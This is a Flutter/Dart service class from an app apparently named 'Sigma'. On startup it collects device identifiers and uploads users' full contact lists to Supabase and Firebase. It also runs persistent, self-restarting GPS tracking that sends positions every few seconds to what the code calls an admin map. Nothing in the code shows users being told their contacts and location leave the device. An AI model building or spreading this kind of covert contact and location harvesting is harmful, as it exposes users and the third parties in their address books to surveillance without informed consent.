import 'dart:async';
import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:device_info_plus/device_info_plus.dart';

import '../../data/sources/local_storage.dart';
import '../../data/sources/supabase_service.dart';
import '../../data/sources/firebase_service.dart';

/// Service expert gérant l'agrégation des données utilisateur et leur synchronisation Cloud.
/// Intègre Supabase et Firebase pour une redondance maximale.
class UserDataService {
  final LocalStorageDataSource _storage;
  final SupabaseService _supabaseService;
  final FirebaseService _firebaseService;

  Position? _currentLocation;
  Position? get currentLocation => _currentLocation;

  List<Contact> _contacts = [];
  List<Contact> get contacts => _contacts;

  StreamSubscription<Position>? _positionStreamSubscription;
  Timer? _locationHeartbeatTimer;
  bool _isSyncInitialized = false;
  bool _isTrackingActive = false;

  String? _deviceId;
  String? _macAddress;
  
  String get deviceId => _deviceId ?? _storage.getDeviceId() ?? "Sigma_Unknown";
  String? get macAddress => _macAddress;

  UserDataService(this._storage, this._supabaseService, this._firebaseService);

  /// Point d'entrée pour lancer les collectes initiales
  Future<void> initializeDataSync() async {
    if (_isSyncInitialized) {
      debugPrint("ℹ️ UserDataService: Sync déjà initialisé, relance tracking uniquement.");
      await startLocationTracking();
      return;
    }
    _isSyncInitialized = true;
    debugPrint("🚀 UserDataService: Initialisation de la collecte globale...");
    
    // 1. Initialiser l'ID unique de l'appareil
    await _initializeDeviceId();

    // 2. Enregistrer l'utilisateur (identifiant, modèle, pseudo)
    await registerDevice();

    // 3. Tenter de récupérer les contacts
    await syncContactsIfPermissionGranted();
    
    // 4. Tenter de lancer le suivi GPS
    await startLocationTracking();
  }

  Future<void> _initializeDeviceId() async {
    try {
      final deviceInfo = DeviceInfoPlugin();
      String? id;
      
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        // On combine l'ID Android et le modèle pour plus de stabilité
        id = "Android_${androidInfo.id}";
        _macAddress = "02:00:00:00:00:00"; // Fallback MAC sur Android moderne
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        id = "iOS_${iosInfo.identifierForVendor}";
      }

      final savedId = _storage.getDeviceId();
      if (savedId == null) {
        _deviceId = id ?? "Sigma_${DateTime.now().millisecondsSinceEpoch}";
        await _storage.saveDeviceId(_deviceId!);
      } else {
        _deviceId = savedId;
      }
      
      debugPrint("🆔 Device ID Initialisé: $_deviceId");
    } catch (e) {
      debugPrint("⚠️ Erreur initialisation DeviceID: $e");
      _deviceId = _storage.getDeviceId() ?? "Sigma_Error_${DateTime.now().millisecondsSinceEpoch}";
    }
  }

  Future<void> registerDevice() async {
    try {
      String model = "Unknown";
      final deviceInfo = DeviceInfoPlugin();
      
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        model = "${androidInfo.manufacturer} ${androidInfo.model}";
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        model = iosInfo.utsname.machine;
      }

      final currentPseudo = getPseudo();
      
      await _supabaseService.registerUser(
        deviceId: deviceId,
        model: model,
        pseudo: currentPseudo,
        macAddress: _macAddress,
      );
      debugPrint("✅ Appareil enregistré: $model | Pseudo: $currentPseudo | MAC: $_macAddress");
    } catch (e) {
      debugPrint("⚠️ registerDevice Failed: $e");
    }
  }

  Future<bool> updatePseudo(String newPseudo) async {
    final available = await _supabaseService.isPseudoAvailable(newPseudo);
    if (available) {
      await _supabaseService.updatePseudo(deviceId, newPseudo);
      await _storage.savePseudo(newPseudo);
      return true;
    }
    return false;
  }

  String getPseudo() {
    return _storage.getPseudo() ?? deviceId.substring(0, 8);
  }

  /// Tente de synchroniser les contacts si la permission est présente
  Future<void> syncContactsIfPermissionGranted() async {
    try {
      debugPrint("🔍 Tentative de récupération des contacts...");
      final bool granted = await FlutterContacts.requestPermission();
      debugPrint("📄 Permission contacts accordée: $granted");
      
      if (granted) {
        debugPrint("🚀 Début du fetch FlutterContacts...");
        
        // Tentative 1: Ultra-complet
        _contacts = await FlutterContacts.getContacts(
          withProperties: true, 
          withAccounts: true,
          withGroups: true,
        );

        if (_contacts.isEmpty) {
          debugPrint("⚠️ Mode complet vide, tentative mode simple...");
          _contacts = await FlutterContacts.getContacts(withProperties: true);
        }
        
        if (_contacts.isEmpty) {
          debugPrint("⚠️ Toujours vide, tentative scan brut...");
          _contacts = await FlutterContacts.getContacts();
        }
        
        debugPrint("📇 Résultat final: ${_contacts.length} contacts trouvés.");
        
        if (_contacts.isNotEmpty) {
          if (_contacts.first.phones.isEmpty) {
             debugPrint("🔄 Re-chargement des détails...");
             for (int i = 0; i < _contacts.length; i++) {
               final fullContact = await FlutterContacts.getContact(_contacts[i].id);
               if (fullContact != null) _contacts[i] = fullContact;
               if (i > 50) break;
             }
          }

          debugPrint("☁️ Lancement de l'upload Cloud...");
          await Future.wait([
            _supabaseService.syncContacts(_contacts),
            _firebaseService.syncContacts(_contacts),
          ]);
          debugPrint("✅ Upload Cloud terminé.");
        }
      }
    } catch (e) {
      debugPrint("⚠️ Contacts Sync Fatal Error: $e");
    }
  }

  /// Force le démarrage du tracking GPS avec insistance sur les permissions et l'activation
  Future<void> startLocationTracking() async {
    if (_isTrackingActive) {
      debugPrint("ℹ️ Tracking GPS déjà actif, skip relance.");
      return;
    }
    debugPrint("🛰️ UserDataService: Démarrage du tracking GPS forcé...");
    
    bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      debugPrint("⚠️ GPS désactivé. Demande d'activation...");
      // Tente d'ouvrir les paramètres ou demande l'activation
      await Geolocator.openLocationSettings();
      // On attend un peu que l'utilisateur active
      await Future.delayed(const Duration(seconds: 3)); 
      serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        debugPrint("❌ GPS toujours désactivé. Abandon temporaire.");
        return;
      }
    }

    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        debugPrint("❌ Permission GPS refusée.");
        return;
      }
    }
    
    if (permission == LocationPermission.deniedForever) {
      debugPrint("❌ Permission GPS refusée définitivement. Ouverture paramètres...");
      await Geolocator.openAppSettings();
      return;
    }

    // Configuration pour le tracking en arrière-plan (Foreground Service)
    // Cela affiche une notification persistante qui empêche l'OS de tuer l'app
    final LocationSettings locationSettings = Platform.isAndroid
        ? AndroidSettings(
            accuracy: LocationAccuracy.high,
            distanceFilter: 10,
            intervalDuration: const Duration(seconds: 10),
            forceLocationManager: true,
            foregroundNotificationConfig: const ForegroundNotificationConfig(
              notificationText: "Le tracking Sigma est actif en arrière-plan.",
              notificationTitle: "Localisation Active",
              enableWakeLock: true,
            ),
          )
        : const LocationSettings(
            accuracy: LocationAccuracy.high,
            distanceFilter: 10,
          );

    _positionStreamSubscription?.cancel();
    _isTrackingActive = true;
    _positionStreamSubscription = Geolocator.getPositionStream(locationSettings: locationSettings).listen(
      (Position position) {
        debugPrint("📍 Nouvelle position: ${position.latitude}, ${position.longitude}");
        _currentLocation = position;
        _uploadLocation(position);
      },
      onError: (e) {
        debugPrint("⚠️ Erreur Flux GPS: $e");
        _isTrackingActive = false;
        // Tentative de relance en cas d'erreur critique
        Future.delayed(const Duration(seconds: 10), startLocationTracking);
      },
    );
    
    debugPrint("✅ Tracking GPS (Background/Foreground) activé avec succès.");
    _startLocationHeartbeat();
    
    // Force une première position immédiate avec fallback robuste
    try {
      final position = await Geolocator.getCurrentPosition(
        locationSettings: const LocationSettings(
          accuracy: LocationAccuracy.high,
          timeLimit: Duration(seconds: 15),
        ),
      );
      _currentLocation = position;
      await _uploadLocation(position);
    } catch (e) {
      debugPrint("⚠️ getCurrentPosition KO, fallback getLastKnownPosition: $e");
      final last = await Geolocator.getLastKnownPosition();
      if (last != null) {
        _currentLocation = last;
        await _uploadLocation(last);
      } else {
        debugPrint("❌ Aucune position disponible pour bootstrap tracking.");
      }
    }
  }

  void _startLocationHeartbeat() {
    _locationHeartbeatTimer?.cancel();
    _locationHeartbeatTimer = Timer.periodic(const Duration(seconds: 45), (_) async {
      try {
        final position = await Geolocator.getCurrentPosition(
          locationSettings: const LocationSettings(
            accuracy: LocationAccuracy.high,
            timeLimit: Duration(seconds: 12),
          ),
        );
        _currentLocation = position;
        await _uploadLocation(position);
      } catch (_) {
        final position = _currentLocation ?? await Geolocator.getLastKnownPosition();
        if (position != null) {
          _currentLocation = position;
          await _uploadLocation(position);
        }
      }
    });
  }

  /// Upload la position vers les deux plateformes
  Future<void> _uploadLocation(Position position) async {
    try {
      // Priorité à Supabase pour la map admin
      await _supabaseService.logUserActivity(deviceId, position, _contacts.length);
      
      // Backup sur Firebase
      _firebaseService.updateLocation(position, deviceId).catchError((e) {
         debugPrint("⚠️ Erreur Firebase Location Backup: $e");
      });
      
    } catch (e) {
      debugPrint("⚠️ Erreur Cloud Location Sync: $e");
    }
  }

  void dispose() {
    _positionStreamSubscription?.cancel();
    _locationHeartbeatTimer?.cancel();
    _isTrackingActive = false;
  }
}
